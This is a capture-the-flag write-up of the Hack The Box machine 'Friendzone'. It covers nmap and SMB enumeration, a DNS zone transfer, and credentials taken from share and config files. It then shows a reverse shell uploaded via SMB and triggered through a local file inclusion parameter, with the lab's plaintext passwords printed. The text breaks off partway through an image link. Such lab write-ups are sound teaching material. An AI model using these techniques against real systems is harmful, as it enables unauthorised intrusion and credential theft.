---
layout: post
title:  "HTB Friendzone Linux"
description : 
tags: 
---

# HTB Friendzone

# Recon
Nmap Scan
```ruby
Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-07 11:49 EST
Nmap scan report for 10.10.10.123
Host is up (0.023s latency).
Not shown: 993 closed ports
PORT STATE SERVICE
21/tcp open ftp
22/tcp open ssh
53/tcp open domain
80/tcp open http
139/tcp open netbios-ssn
443/tcp open https
445/tcp open microsoft-ds
```

```ruby
Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-07 11:53 EST
Nmap scan report for 10.10.10.123
Host is up (0.025s latency).
PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 3.0.3
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
53/tcp open domain ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| vulners:
| cpe:/a:apache:http_server:2.4.29:
|_ CVE-2019-0211 7.2 https://vulners.com/cve/CVE-2019-0211
139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open ssl/http Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
| vulners:
| cpe:/a:apache:http_server:2.4.29:
|_ CVE-2019-0211 7.2 https://vulners.com/cve/CVE-2019-0211
445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.0.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
SMBMAP SCAN
```ruby
smbmap -H 10.10.10.123
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.10.123...
[+] IP: 10.10.10.123:445 Name: 10.10.10.123
Disk Permissions
---- -----------
print$ NO ACCESS
Files NO ACCESS
general READ ONLY
Development READ, WRITE
IPC$ NO ACCESS
```
SMBMAP recursive SCAN
```ruby
smbmap -H 10.10.10.123 -R --depth 5
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.10.123...
[+] IP: 10.10.10.123:445 Name: 10.10.10.123 
2/3
Disk Permissions
---- -----------
print$ NO ACCESS
Files NO ACCESS
general READ ONLY
.\
dr--r--r-- 0 Wed Jan 16 15:10:51 2019 .
dr--r--r-- 0 Wed Jan 23 16:51:02 2019 ..
-r--r--r-- 57 Tue Oct 9 19:52:42 2018 creds.txt
Development READ, WRITE
.\
IPC$ NO ACCESS
```
![](https://lh3.googleusercontent.com/O4pzmZNFGbiAAwAUWZERP_T7AWHf35fKkjQn50cLGT6XcgtAX0P1FQMYKh8MzUPzwEGcYCEc85kBLdX7LXa_2ipBrWvF1eTa8ldKjkXnO3u7yrYUicEd89F-H2HvC601gFtHz7cstwi4B9Wor51lTkzcJ6iJdMI7kZStMI9sCm9hxhXImJDCZvDG8smbmzwfCxKY5nWPGO5oGMo6SIfeTQxX5VITmPIh-DWwc5WTqODy9E3Kmtsecwy0y0g7fMrTbS2KPopSuxzYhzapHAtOphp-NYt0Q4RBz5vlFsXBmpkA80k00aAywHCXhfWa9_3sOHJj1xewgPvQRiHq9zJNNvlqZucImGRj_I5fdqNLVkQBxjEDaIoVC0kYfyQNeVwYdXAbMz-ELDzxACAlDacq7vFD8IfzZ9h8LVLe_NQzF5NxX-RmL1omGPEkXbf4HDe-WHoC-OrhUyslf-_vPDIEveYILwtDaLifjyIPNkXK4Gc5qvIRV6MOyix6TYXR24yGCGy0eadL2pFkrRIOhiG8r99M2Oyi1mdUnoJ3ypISHI4Avjj9IQINFQpVJTQyXxS6wSzep9CaS70N6Jc_P8k3E6qK-xVyKVFvFdbG3P8GCxOXS10K_wvVbrSCRZvB_dJpsQ54nCLRd8IxUpq_Pya1eXaptW1PpnPJRlrwKbyITZlFEVat2wWAbN8=w766-h511-no)


# Privilege Escalation

We use smbclient to donwload the creds.txt file to our machine
```ruby
smbclient //10.10.10.123/general
```
![](https://lh3.googleusercontent.com/bMtxkBFwC0LIqrhO-RBkBheIrcozv-KPVzuS4mUlDFfc-j6cNJsvh-PurxMM-MwoQw1juHkJW-gqKluIkJoCQfGiIftvZubl2kX9qaA8LOaXF4mViqelwuk3wYjQQDUd2egeqeXYIBsJXa184s4hwAu0yPjr9qlMlvF3ls0UD2zDV9FD6LXmmDIZeTGEkRkKLauNt5aFj3ItISHaRV28lexIoqe-GA0MkVXGj2VPDmz63taXCsbbN7Rp0KQWhdHc_MZ_vqRpMgJ0YJAXeezc8GAbnsS1y6YQST2c6bsRZ9qC6WwFNDLcKYCZQRqciqGwdpglTKNhqJJpymJHlX1m-iS7794LXhutmBzNYVC4OqyjHeYan1kwWZsgxP_yKbq4Qgk88Dv8o9gEsKELOC-n6LF6oEobY4AO68lMT5cYThJRG5F-7UlwAriN4oWbUjwqrIdW1-Z_u0STvnL1-H2EAUkgHHBS-O6YtxX6OcE1K85H2W3OQ4oLQVUKbsXDHbaIwO3Ni0pqbdQz1r6-vqWyHW57frpO0XHAPX71-SlEqb097Lpi_V8l_QPI178rpqVQw9FzUAwq9TcgpUYosR9ebsO-XIt2Hpx3pV2L3Zp0gSxNA-pUfY_mute5NS5-mi19HpucXBkLi8apuJg3vXpmq2KaF0JmrzH6IVLh5WlFR7VeZ5UcWCawfTI=w978-h145-no)

We obtain a passwd `admin:WORKWORKHhallelujah@#`
We add "friendzoneportal.red" and "friendzone.red" to our host file as the landing page
suggest to another domain and our nmap hints the same on port 445 and port 53.
![](https://lh3.googleusercontent.com/2wqZHZK2JEMlpv-RghvYZHgU0OhCYX_v1kOGeci8G8LZnZQgGchllI3T36LARwcSqeWXpFo4XkwU3KPmp7Sr7-LoZ_woax6Vug295ZEWr73GolAR3_KDziV-qAtvJJwLgGEUFJpWNJV9tdb4rAtvsdTtmg_Bn1hvwtYH5EAfF1ipkX4eD-bPs7aLIryz5x_jCwt8vp2dE5mBzV_5ARFZuDoHXQOYbtAFwzvHziYkjqevBaTZdBdVTGnG9AI7USj4JkY52ZzBdRQbQNDeYQ-lSM2XUNB7viKSUa1OE2DrXWljUxBkSXyCEzOOOMLW8SrBykkma7gBrZSfkjqBMNW-LRlfqVNjmDtT3CoMkYYsLvyxxlwze0KQDsAM7y9ReFAyiDCDBc5zAxRKV2kx6ZTbEJc3VNgyvDZapgRwivDkxnnS-zfHJ14cAVaJUCcbmCrXSEsvN1wjvSI1QuK9Vm3KkIOM3coBqY4AFHFnAvchaDuoXVb7XeNtUNPRf5Z-5XKGcDGSG0ZJkgcima8AH30ZePFaQN5r9pL-VW3I-0MkLj4-jHt9bN_zMvZD829AF3pHvdmPHhcMp5ASFBTwWj7ANaCtug1qQQ79U2tcHgKwoAd4n72TUffi3bj8OdZu1tFRCiuFpuofPhnynVriVaqQ2dvK5xXJfMiRrAbi13oyj1QdhOccVVHXhnY=w593-h147-no)

We locate and interesting directory "https://friendzone.red/js/js/" at first I though it
was some kind of passwd but after refreshing the page we notcied that the code change..likely
the page is running php and not static html code.
![](https://lh3.googleusercontent.com/JSNfWkKi7VCEkwJm_YdSTk73NCH8uX_l9tJbE97ZFAqM9NF5QrtBPLO3_Yz9AriA6HeRUGcRMv_SSTqBlsYBrjIexDXdmFWbf7TresFh1fes-xhfu5cPbCDOTONasCQQJRc8Wjxm_ReOz2kiMJORYZbtxsjGx3xFTIYz5e1oZk8hozI77v6azxRtmmTjOAVaeoEY6hDYT7Sq6GWX2ki4j9Rqu7ZwN_W8ZZMmfIYk-u3Jh2De4N0RmMsoQeRjiFmfH1Dm4EAzaszN5XcHI9uk8nisqammNMDxu5_DrW0F4xJ9TaYSFEbLwLpSYQAQ9CdP8kOYJ03MRGpmyp0TiyAjz7Rup16h3LqdsDKlPmuIGYnHZ3vmcTr5RwLqFPDgfKlP8NsYxfKQgSonw0YMvMYiXxu8Y0ulpMxL-kh8Z7-vO_X3unK2LhQX7pnrro4LTyP5Fqzhl2DxspyWyjRfAF_YWtyRvhgLeAqt_21pKB_SCXzD2Ch2tjvlrSxQ7Nv5HuL16mfPfGmFneTfikW37sGkdb0SFr4qy8x2tJ4KuHwEHYwBXyLfz1f6WBsIwgB-8arezfSjAAg-Gcp0184lVRLli7Odp7E8nkVE0heTTRZdluT5TBE-uGBL4rBeWWd6ayUg-TcbA5Twi-pSukcI7Tj8lehJUzJyp1a1t6BsoquyT3M3A8dmmHBQWHY=w795-h492-no)

![](https://lh3.googleusercontent.com/Dx_PGnfS9mKnoMH3HySMJ-QeRp21vDOoJE66Oyw5vSAg7S7E6n7JWWOy2Egc-sZhL7ExZqO9pOUtEH91-SbVfqidjLsq_L7hr4fk5cZAMVH9j4P43RwfU0EwW_JegTC7UcPRUWqMvz-TUc5s_Af_TOJPBkf306zc8hshV5iAAp-07ETC5dB8KXoQHJDdSBNSOeN12RBn3c9sYTH4VXt5U7r7FYBA7z80qoEsOPutx4ZlT8_LxG0UpUutBgkZwREq-vmizE5IFnoYhAuRnkzm-jSteD_XMq9oG_wdkcP2gwgOG64yidi5D9wxrePBBnA8JjbQOvUoC1Hn8Mlh0mD2dXYbROcRQvVl5FczcxybqWKar0JY4uCU94yIzhy-8J4_U8kB0Ra8yQfe_PGKOXKEcDDh7OV_GgTUjtD6cbA9zqQbAZ07nt1A7_TvSa9iCVbk5QeI1k6jK5V1qnaJU2JrltcJxzvTo0TtAeUkS7Gb1KvtVhwjpHAiG0b6xVVkCKzMULMul2TTARYyt8rxQVW059g7cI9DHlBauZyPEGmjmqUTtOgytQ6cO-qPXeJlXG16VbcrHLSUEOKFwz_qq8udxhwdGMqEBQpmbHnMbO7Ts3D7sRDWDLEutgFJImlWtrOausGXOrELe0nStmvAijPuGo9hBwVFCvhXBKfvgJyG0QVyT-HMXPL1TwU=w498-h159-no)

![](https://lh3.googleusercontent.com/CYD0J2WM4_0hJhRHBm2Tl3PJWHuWb6psP8Gbl5LA-1wmQbCPKjwE6dTsaijfgHaO9SqrMeRwL3Zo2UmB0yBlaNUgbfiYTaJLFMmJvZ072P3TvM6occ1btFvW_bbJOKIVjQV7r66RJeYWh5j_acEepszUSNuWU-BeuEmCZkMPgYdAhC5_HP_rxuusj-OzGP3AtOAmvgui18NPbyNJ1BLiM4AHRF7GYHofSWJZmtaH3xCU7Zu7GHSAvIZBuw6uUDaGnBkqG5UBooNYrgBiMsVZo60bdJIqidIItLCRQvAzp7zDXRFxrD29Zreo6g0prdbc8R3BAfNC4kJzFJ3t4r6gqo0K1amQTe4ufrAbkneTeM3hsfQI5w1Wg7yshinkOjtkGdj2PNDxeS23wS5lZ0FWTkr28ekPKj8KTOJB_sHpzHsd4xqZ6obtTH0VqDFAE0ZWZMA7ZKH_GlID3gmeswIsfKG06mZer-S4ACspZqR3iqL1J5ETB9635pdySNRPpD03Ywb3y-lS999TryvXcIKscRPnXUlylij4FGrkAJAyxQnzGbzZmdoeYWpnLhWa5NQMp4lHtO19S01uJOH4Gh_DON5xT4YUzRl877ch90UGqy-3xlFz7yCNsOojszzAIlhPVFoB9jbwW8dK4b3G_MJyBBCH5bp-n9OCCOVWGW5olNFPOvT0YfI5M6s=w456-h148-no)

![](https://lh3.googleusercontent.com/DY7B-xv8FO2DanRPbqsTOKspLGToMdlP_4iczl1YLkbYccfAKn1zorgAALGj_oFnoNfusv-EBONb5lTxRL3cTt2B1FvAbJftXERKnalUTjVHVXnLgps6f7EnZdGprhV4gkkXnELZN-y0a2eL_gWcCAT8W8u_wIwPki1a5NRR5A49geXnU_LqhXnCj2V32ysu50UUN9INmfi0gHWkRs_1KPVLvbxz1089hoCE4zTt-q8vrAh0xYqpolNnSBbQR6lp2Va18XL52bsztuQ92YSk6UQRzuGhI7l3OwegT6B3wIDOlATxJ5zjmkDn6QMszk99U8QNeggrXNLPtwlPsy3MjaFDoRPQDrSg9wcBrpq-3BxqzOV60RLDwQNikA4A4WovIfPJVeWfNlsGq1YNevpsiSPyTcNJkg5-hLxSAFNs5rKw3vSQAV5kMZfvNQwKuIjGWOlRfwEkvy_wY9I2rrv8lhpY2d2ZJ85mcxCMKZmtq1MUr2XsODSnnAhPJt4rHfVhXE0l-SLaShrnZhL5nY3SO3GrGmArFEdRRQ7ncGnJWQPL5zZy1NsrQ5kIbA8eAMKxIiXUJLsDN1cDzWarSk5FMQNRRA08z-lpZreRUcMkxgYNvVKXGnFA5A2VV6PASf6MzQMseQ7xEa6sV7_acw9PKuPceSBfDUo49owYGZ4wfbq95XqccNfwAJM=w475-h275-no)

At this point, our most likely path is the dns domain references..lets do a zone transfer
on our target machine

```ruby
dig axfr @10.10.10.123 friendzone.red
dig axfr @10.10.10.123 friendzoneportal.red
```
![](https://lh3.googleusercontent.com/a2K2GGmFwGFaF4Q8i5kQNBZTYSyaBnMl7n7YPh0ZhYUhjg381zuxQ0Lmz6aOmKWLWl2VWXLB9FkqRp_EMw4WT850p0RCyrbtDmziuEyhiVjTfmtXBANJg7xTtsf89TLhS_lKRGOV5N3TiiY5lXiaOQn41KhYmw9EGNheBv1Pt_zLPXwMBNGsdcw-JTu2TUbnBKkjjA4-na5oRMq_yvDcuDjW-5qihRYZAa0WoLPs8I3MyauI2EFkK3dlKWxy9HDLqOlDDavO2mQ7vkf7qzgQd2bdnYrUd8MltaxQeGLiYKXPOXJccky-NRc16iod9Yh_9S9jwsNvzNd0mnZAYfm0YSRtXELDlvl6rBWX9eJzy955W9KU6uRQyVLiEOeVKtEUea5bsc9g0BFp2lpKOPxya0tzso84y93ZfFX23--B1jcdWoher0Eo6a4f779pGzfs_TkbkTUFmhvvytarqdoOicrtVFyG2PsMEddKO6uhlao0NB-ZC2OttvUredcntdgNwhrnQSNNmQtttCU1nOWZ7g70Z3jqgp_sZemK_kpzDOv0yHBmgFsmSY0v_6T99-quQOW2pE3K-KHQlvLtBmy4UuxgAETtyznJf0BGp8pYTVDK2i3VQKM0dz9wSQAJRxawBRIBQKm8lMILe-yUUNpRb9OPlhlKFcuXObmazXtVSZZ8kczAkGTj-nc=w596-h291-no)

![](https://lh3.googleusercontent.com/q5hjO660mo6QoKMGMA4U97C_jHDYZgi-HG-gwrKTs9XKOJc7u5EZeU-RthEw-Js1Xg0B9Vdvj1HFSkXSxh7iGj0GXmV21OkSI6JLSaEVEte_4ldKr7kqIQIviq9dRvT3aoB8qZeVGao6qOnvuihOwuxzwd36NsfUK2aTifx7excVsiFYiNFfEk4QmihvMThS61jgh1yQupv1gNjBC35aLQuy4BmcpnqtzxWIO5Y2EW4rHO2fVtV1f9vhPn7xeVxQktr48tUy4v8pfBLIwm332DluYG4wDYbVCHxUrtzS7PiEYW0NXcEB6eqVSfhpIKDzHpx58J1W5wodSkzUv13SH2PnpuMXr9qS0W697M2nyRDtFcyWr1_XEEZ-fAYcAza8pcUJJtA36k8Inkn5QXft9dXgkkpgW_n4eFa7cqvP1gNJP7FjfLOtVEIKdZaXtP-qbq6iXxZy3s7UP4AAxRSoI_goNXTtb0Kj-g4zaToqaPpv85hWSyImwOky3zp2RB6e63H6bCl7O2rv-kDFcxOsKJQYEEueU0S3Z1e4T8LcuSpNEZVL4aKLkXm2CX0dpZ8XQRFU9zGFgnWFZ5qz95o2byMptO3aZTMPmbKHLR30dNSTN3N2e3lloj7bbJ_n8WcU2KcGfH6vz60QWS0l9lYqIqK8Qf5UCEHwUPfc0cYpJlXO3TH6SJ_rrBI=w614-h307-no)


We save the info to a dns.txt file and we clean the output
```ruby
cat host.txt | grep friendzone | grep IN | cut -f 1 -d "6" | uniq > dns.txt
friendzoneportal.red
admin.friendzoneportal.red
files.friendzoneportal.red
imports.friendzoneportal.red
vpn.friendzoneportal.red
friendzoneportal.red
friendzone.red
administrator1.friendzone.red
hr.friendzone.red
uploads.friendzone.red
friendzone.red
```
![](https://lh3.googleusercontent.com/ntODtJPQttlWy1Z9QFtJlIt8PmX-RcltuJlmjtbapccgLtBHYnJ-Lb99LQyhPu7NhGhjmQpVgjeT03au5SDuSnshAc0RtzwXEjIJjuxzatGl7a_no_5Sh22yTlC7WAJh-0sfLfr48Hb_PPi3yJ5F4arewtZYFrKa0AxmvqhbHIh9bV7JkBGjmqu3ORUWtB7ZRVacRRzcOxWFU1UHcwF2luygoVSEJ0tgFI16Qkc2e4xNJt5atXAnzbXiwNim4KROD2vnPVS2ctFnJcNHNZP-c-HfvN8nxl8YxM8jppHcjz6uJeXDbimfBK04QMB_w6sBHsQ7837UXQcjxTGtdf3RCjpWVvi04teynQB8OAAUiNFwbFICo0gCyLKc0O67YP0-bfN1tV1-UFCsfZaiw9Li4Tjz9Z0gfrjMTnJFd6PrvcIw3GD1Apfx0MRbONik4uQyrNsbAn9QZAwS-CZSlC1rZ2WgFbnz8ec2pR14iZxa-W_OLYHgQ0Jss7UEXGspgpqypScyFx1kCIdurXf3v1uYqTfpESmplwUOVlPYNqSa3xAfXQjw8tQCuv9UgdUVuoPMlg8J5UVDVy8BsTB4yAsyDoqTjvIdUEWXK8a8mkeQz2gzu-bvr48XHmFqKchNwRJsKCDAbaVHI3sd4_LZfUH15DBo5_Ysp3i9uP94FnJqT6W_Ue1S1HYVuOA=w930-h249-no)


The only useful address were `uploads.friendzone.red` and `administrator1.friendzone.red`
![](https://lh3.googleusercontent.com/F6Ak2L0sVHXGCNocLsTFzc0mPl7MiJs0NTapSKkA7UayPFt6McM7zIxD7ouVkNW4svl-j4USWJaAo3xKMNEMH5N1EyjiqvNt2-C1MeI7QjePDihQ029K9RrLT-xpGAQo5iKMaiHwGoYMQISBklaBq0k66ITodaWV6TFx8lGdtl3ZvrPUMYTSbHX8XHX5tMIyIVjZ4V4Wz8Eqj6khctnhomv_6BpKJYXG69myUKhn4PmCaeJlJMu3XGaQshTD0bT6kIZPtiX5HIUXJn1MlHLem10bux0qDWs0p9cpjUD-v8rvPthnLflKFG4tYLYNSha_p8othuh0BqUFHcmAi6WTLK1QU1OuMKbb0w4h_EEMKCwdRKeYn_C9a_oppTwKpKHDlZJ9SSwlvHUjSWFzaEBUd-LiURf5BoL5qeAyV0DLe62pj1e6XGuRk2WwT9upBWPpUE2O_uv3PhZCf4YIQ6h9QsOB7CHuTzDhHY1SbTyoTYj9nGNr9SX5P4PGtn-ywbDXEHWZHNSQQ8Sd28VvXPDYAF-Nz8OYQUxCfZkNQYi9rFsZqQd8KFzlypXqX6Axfh-nkflHAuzdenX9Lm_lyttIyqIMEvmrg2u-j_cReZlL8N2JsS_ANJNZUsnkkSfGZqj4ieO7KsECetgfZMugX6257VHpZMzW8gHYPW4giWyV3rxDMzl9XkToMow=w693-h288-no)

![](https://lh3.googleusercontent.com/NgCSoFXUf_sFkRsSqU5Jmct54TV7XwHTnHofsvKap5-V_OsLWfbWEr2Z7zhdaOHv-747UruwZOtlPGWG49GlsLni4L7cTe70lYlGjtuwgftnfYxVKLLaUOG83lBkZXd--sepk4UiYoDCO92vkxZFdbEibC8lck27Yb2ttN00Bn4bS70oKq9Jebz5JaHNx69M1aNXi3LQ3T60byPyF-1u4rBUV4PxoT4KY7VHT9eADwtxB7hpRcg4h1bQaDw1YtQo2w36zgKUCANziPFA1tFMdvb-a5OMMn-rmPaN0Fh2FqD9rUAtUSyB3cttuPnZE1dJRT4qN9ieFhOWSOi92II0UZ6a7sJ-5LmeeNVYuTpl2yHapjUM66UjzSCsSWuoq2ytjDklXuLbxpd_k9CvRpFAKqGw4onhbekRvNlV7FIIwQEKArMY4FXlc1hM1E4ZWgvoJjG2kiAVbb7qX6ha4En77d-tHYHURKiDLhM1IVKTtI7rMGbPJx4-LsbG2-R-Q1LYGL8ucWN2ZzJi_NG9b11Ml7XBrgQGlqs40_tf_QWI1bWMq5xxzmd0P_IorGsoZo-sn5ZgFiBySHy-BtUN_MRHHqJLXNk8zVInND0ZN-hFudqkojS-QlGmO3kOayxb76-ePY5Moo4kJEM_XFRVTurjF6FR1dW-WZqNTu-zOJQmTcVNeeBIK2HBugM=w1017-h88-no)

![](https://lh3.googleusercontent.com/upaY8k8YjXHugTqRmIqUVpdxUnkryt9Tx9FFX1-oZDTz808yN9yU1ydwBFCaiG0YbDSoZfgjZ6-SLvdTSgBWZwMbFjonV32_lxAMOKE_ftkgg0vxjpMt3DW8co6FuvWbLaCXpNONoizzKtMzjbbHC2D_v9klOSW9ob9LRDVNUeKLS73p7Ls2sodbEA5LvayngvmzLzk6jHhjWzRCg_153Ozmfd-kVfLTR93t7jOZa2itwbG5srYDvU3VB2dZF4r8Etz7IczTfyVRW2gpGEj7C1doby2TksYVk1qAVoGb7uR_PqAAKvDbmoRRRC6hyg_UcBeiP76cgTVCrvBLzmW4Tpw95m7BD7yHVV-osWGEE2MIWV4lk_aIWK7LMiK7i_hFcrjMDMZAtxVkJfevuuTHvW-aYdbayr335W7t6iSxlPiWZxLm-xIuKdBH32w-gsgJZl3cKUPmWiU7BHbLQdEHRiOGs1FKNu5OixFHUJOrTauBU0VtU5Lbbw467Selz5kpeKHOlZqL32xh7DZjhfo46qzq0eRFkbDqweFsszaK4Wz1CD_1AcQnf6W7AXEeYmoY8YiswSOoUXJ7P9O2NUMGekWJn0aKhKiN5Xwy7uYo1wWT_riePGQLFFpifFWgO9-TbjTa29uAideh3phM0SCjKxcxGuqACDCwdZ8bCxTSAZxS5FgFglSBdWY=w599-h391-no)

We upload a reverse shell on "uploads" but we dont get to see where IF the file was uploaded.
we only get a timestamp

![](https://lh3.googleusercontent.com/Bd42yVRsSnm7qyuccfk0EQvmWzmDKLFdwvrsdugktEt5WORggv4BE7tkGHrNcfurdmQjRrTslblhavhtWm9_l8OVjU_bM0PpNdPmppIpb5aef2Z_5kLphcJEws3CK-yBy91vXvvH078_BwyzMNfcjZunhURU1LzXza1BOkyO_XIErWJFFg3QTchPP-1ylNjpWj4jxK_p2wU7spsuav2e76ksR4maQXZPi1fVVJLYBQ-niZ6_w4q4aEyrRrDUy8syX1ogRhMH0lYZ8cHDCxWuct7VcVpnG561Ov0tgCJtseFzkSrbdva91yI0H-BcaEK7jJV8fFwbEB0QRxUrD_n-WNTjatGEWXd8atdhyZc9ZsrTBPN7OmpEoycAV-11kYFXGJqThAnlSGseVU9caenEyPxI2QBUbO2rdXoeXYsmBS2SD_ezG7I0UAwJEsonq9oEJDmzC4QuWR2Zfs9-miuOLZp77u3dV2zNSLt5RZn_smIg2e4ORX4ReBeGv3v4mNNIeGORWUT6cNHMTWY1dsyApI7Xq8MkxmtJBFkOWdxRd2McrVFYwT8GgL4JTwbLahN6c9piptsMSmd-7lYQzf5dx31EBdvk-S6KNS6qyJUsr6Nx4f4QVg14cH4M9-5Z7FFVeIYS5O0IwVAImXsQ9b6OoRgRiJSkAyPAfT7nrnQJIV2XDvyAqQdmuF0=w764-h382-no)

the "admin" portal give us a hint about how to search for image files
"image_id=a.jpg&pagename=timestamp" but not luck there

![](https://lh3.googleusercontent.com/Qnf1IwMDJyy_qHSbKZZrZcgpGMFc8jhcqCEkqTkXXbCDQvepoI6hLwhAFK39LHPV2_heabNXRk95uFMgnYmOizTuLu0bC1-VBoStRK5q5GCQLY0ssSsN7jhnEg2EJ3-MlOupBCkQnujpLe8D--DNeYOYBhbWXfI63fW9EYFZmsvRsjnaGv92RrxLQezJappJr6kHfqyKbA25h7D8Fy_oNNJHE0gADJQkcRROMva9ffaUhQa9Bgj4anw_myYaQ24QGXw6-nTIWXYOp7d99dgHTX83MuiXCQeDxqynNoneE6M4RqrFFAt9nHNuijTybh0uYBZnaT31UWA2kI9fW8SQatEdCaKLvcnTsWLq8z9t1ujBzP5He7stVmf3qnnBKIRdd2dI_XdhaOylWePUcWJz2wNKMIDw0nShkrPfxtH5R3iTAu8k7UJM_7-3HvKbTBkpQnlbBhMH28aAAMAc6O6p8G8fei6fKC4jVulR8t1W3qYFGpLD0VXVO3B_m2G5y7yhWA_4gktKEyA1HAPVD9p6e2uREPS9z0A-WwLPoimPkqBmUtnwJIUHq_SlJ1QrNFRVaJTT_YAVZ8nEzxwQlcZIpd-oFg32Hsx2Anz3yy6bvumGrB7MuorWlrkfnrXZD1S5cvOGWp7V7Z8jF5c2rVRRuch0Afy3cv_asehhoFoom94CRIPKRgH25l4=w581-h108-no)

After poking for awhile I realized that we can upload our shell using smbclient on the
directory "/etc/Development/
![](https://lh3.googleusercontent.com/LloZdpfxIdoJmRU3RXvMMIsJkBjpx6g2P_DsxiGYjLhL_MPmcEvymauREaEXWWBoDLYfB-qPi29TcKY7xn0a0AbJnqBLh5QlMzu-D_iH53RV9uMVHOyzuG-olw7Sptac4Ra654IV0kKrsDFd-OLZ4KkDCOB6kLf9MRVE84p5vqY_DTkWewls9f9jPvOtNCgdKbitA4Lbyq412H9EPULNeKbJgVDKy1AzA_G1xDfjKR17gLIZlvZPsiYfZmzipFRPN7F8EOeYlZX2-5KT0qkvkEljoL44tSq4RP74Gp3RFd71pUx0n7g02tmijaQxOjuyE5DW5AFZMQ-cIvfb_b-iWYTraPCwcSvUoKURxQBi1t2em8zMoAdYS5MbxNjiyvD-k7aBT1KxqtWfK8KjQ2iJrdtJUL2K9jviPU59WUTeahq3oAG-RLUpic9ElpEO0JEmitSpB0aVO0_7Fmz8aIkcDHDrTzgHarYMbcR5riRMhyuPCEYAHTXr3Ewg8Eu8qXx595UDnSXLoJlJdTpA8DOPLIsn0CTE3HeEeMPSqfitrhA7kMuN-UnqNTL5u1vALymrHinvSQu4VzC-uydvBpYK4Fwt1pqjVp9Pl6QzWB-6AxqiySB3U_shH9qbzqBTtqHUJpHOHdQIodU13oS9wrix2bfkne2XtkXUaMOhl1r62U1NgD4W2x6CANk=w831-h324-no)

and call our shell from "image_id=a.jpg&pagename=/etc/Development/reverseshell"
![](https://lh3.googleusercontent.com/o2v5Gj8aGBfyTZrpzInp9DKqc_0GUOVB_Bh-kHPfzgTgRJRMt_UQwP9-lX8rNT6fmtCPMSMylV7j9zAaWA_mOXAK_69oEx9IpiHdYoTjhM6GLYrRJ13C7ANUwWHNnk554gB3wQzvuq7XOSDE4q9yA6lQ66l1PAW2mxTTL-mMUrSJZv08n4EeLzUDsQ2t6pqTpzirwMX57xahlM6mTiMUnFcy4NcQaDnYNnoFxGRiqhGrTDnqdzcMnVEXeg3OtceyYzVKRNVu_V_Ut4j_NhG9ymAt0ELgmKmcL646rh8kk7NToAL-q5bUHqyQ9A5lPdVyVS4vlZ5CYa3z40HAAUgliNrtuogQEw3ZG3RoleEcPFQIlDq0mg0B8AOa44aUvxyIMk7xdlbkA59T9nGL59kppdZhKm5l9bppVWvHhngGJqEFVON06oSIuFesX95rj4HVpxqE5-APFVp6zq1TnB9d2kHspjMSNFIpZal1mKuTniVa321PZaWrNE1dPs5QqOvywlDNb9wHMJCmO5dx_qqtIhEH0dQT_YdN3aPd9W1Z-5XcrIpq3p8xEkkwBLQDp2dcolcUMHpJhjbTtLaNhrd6bIsE68qCoSKQc3zIhUJWehlDIMztlWiCw9nIhmhhPwlS230evRIxzXsNGriAnCn_EImTEdpvHZ9ClZUhVphDNx9X0S8jLU10GfE=w429-h59-no)

![](https://lh3.googleusercontent.com/cSj8mtb9PmyyZRhM4Ikhn2KnvWbqJiLXqevHPbq6iS7pkZSLyCSpzPnAcoiNvhDwVLwYnuRViJ7eIzhCvDrkt9g3wY0a-NXIDWqCHqyorZS5CUwQiR8vKXWGLKXm-S9sH5H1I6SpVZCBGRs4kPvG0986GPwc_qIi2wkFX58gOhwxRuNkWwITGWPTBKROac4YiIhdtnhSunlKTWmxUIqcBvTKCwwKBUbl4RxLUFtya5C-LdJqp28A2A3qo5Ayzli-jRVE1pqFN_Ff87rEnoLfe2lHq0CWYx-7Czrz5uS_w8fVb6iq2G9YfC6eaRsEY6gPVUW3fV2p4RLZXnOgkeCkiWUDTo2j0X4kyD0BxrNk-sCmweEoHfj3Is8oE5yzxqioIJ-GUQoIa38hvN2VT3gi8bZnvcteh-CV-qQKqS1ASqSuD4LMYyFCMqMMgcQqp77av2LyuRAdbJ0qOPnWrKpW0017xnXOvPR8W6sn2bd_c4OFbQ9a7N_kQfUw77nmtc7EfwLqsk1ZL4fSiW8HNyWrVFcjjylq58TR2es-oWsrCVlUc02HNe7j01vUONdsL9CY7dvmj-wSdLoEbnZU1vhdDvwYBMHT9s-NJ7W7Rw2edb0WcRwn6_Sv4UcnfUaB4nY7XtUf_RMnGMnzdwKazPpAQXiLj7PutdOeZzTruJdtKsPO4-BSXgaw9KE=w749-h175-no)

We located the passwd for user friend on `/var/www/mysql_data.conf` and we SSH into it as user `friend`

```ruby
for development process this is the mysql creds for user friend
db_user=friend
db_pass=Agpyu12!0.213$
db_name=FZ
3/3
```
![](https://lh3.googleusercontent.com/3GK64luu8NpgdtG7ESqduNCB37GBSAgzNPboIBvPXyd7BmQjmEj5ux51z32yZN6OOZPh572oMFlMjaNAsfc0c7vxFTSTsBPVdZ4mQps7jhDEx196LK1Z2P5Io7beqkdNqsokPINycx1VH6Pt7sNgQEgCMVeGLjfk8PDbAl5QoTDFr_KMNcWkq1VC865fu01Aq9q8oRwnu1LC-sSMoVUqEllASE-WaJB_sCVhVluVUzvle6ZIP78kmh24BEWY18FGV5Mo3Yy71IbvUqzhyjl_j2CvQ0aUwYdNtgWeM5hRU3KqgKeD0iFeJymYyOukS1KyFv2GFrHOzaNKL1F349yLnqJO5MAWJkpFEC5f_yCSVpCWp8SKlcg_ZlPAyr9X9uWfNTQGD7ONeHMPUWOUkKPCJGhASIrz-qj_OXOkp_NmbZwSDTqZ8v8PbKkGaoSiuLVHBxFnmDtqxVlFmtZE8x_dqird8o9ImXfyRiQmkjR28N0aI5g0Ie--wXnmjr7SYXVlY5ux2R1ZjpphguCk2M_Z5g2MZwRUx0PJkiZ0WBo65IqElpTM6zitJLo3T7nitmJTXuziPOtrGGO7Yl_w